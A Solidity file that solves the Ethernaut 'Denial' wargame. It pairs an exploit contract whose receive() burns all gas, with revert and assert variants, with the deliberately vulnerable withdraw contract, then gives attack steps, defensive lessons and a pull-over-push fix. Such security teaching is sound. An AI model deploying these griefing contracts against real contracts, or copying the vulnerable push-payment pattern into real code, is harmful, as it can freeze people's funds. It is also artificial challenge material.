// Ethernaut Challenge #20: Denial
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
 * DENIAL CHALLENGE
 * 
 * Goal: Prevent the owner from withdrawing funds.
 * 
 * THE VULNERABILITY:
 * The contract sends ETH to both player and partner in a single
 * transaction using call{value}. If the partner is a malicious
 * contract that consumes all gas or reverts, the entire 
 * transaction fails.
 * 
 * This is a DoS (Denial of Service) via gas griefing.
 * 
 * ATTACK STRATEGIES:
 * 1. Use all gas in receive() (assert false, infinite loop)
 * 2. Revert in receive()
 * 3. Out-of-gas attack via large memory expansion
 */

contract DenialExploit {
    Denial public target;
    
    constructor(address _target) {
        target = Denial(_target);
        // Become the partner
        target.setWithdrawPartner(address(this));
    }
    
    // V1: Infinite loop - consume all gas
    receive() external payable {
        while (true) {} // Burns all remaining gas
    }
    
    // V2: Assert false (consumes all gas in old Solidity)
    // receive() external payable {
    //     assert(false);
    // }
    
    // V3: Revert
    // receive() external payable {
    //     revert("Goodbye");
    // }
}

contract Denial {
    address public partner;
    address public constant owner = address(0xA9E);
    mapping(address => bool) public canWithdraw;
    
    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }
    
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        
        // VULNERABILITY: External call to untrusted address
        // If partner consumes all gas or reverts, owner never gets paid
        (bool success,) = partner.call{value: amountToSend}("");
        require(success, "Partner call failed"); // ← This can be griefed!
        
        // Owner's payment depends on partner succeeding
        (success,) = owner.call{value: amountToSend}("");
        require(success);
    }
    
    receive() external payable {}
}

/*
 * ATTACK STEPS:
 * 
 * 1. Deploy DenialExploit with target address
 * 2. Constructor calls setWithdrawPartner(exploit)
 * 3. Owner calls withdraw()
 * 4. Contract tries to send ETH to partner (us)
 * 5. Our receive() consumes all gas / reverts
 * 6. Transaction fails, owner gets nothing
 * 
 * LESSON:
 * - Don't make external calls to untrusted addresses in the
 *   middle of critical operations
 * - Use pull-over-push: let partners/owners withdraw separately
 * - Never assume external calls will succeed gracefully
 * - Gas griefing can block legitimate operations
 * 
 * SECURE PATTERN:
 * function withdraw() public {
 *     uint amount = pendingWithdrawals[msg.sender];
 *     pendingWithdrawals[msg.sender] = 0;
 *     msg.sender.call{value: amount}(""); // Their problem if it fails
 * }
 */
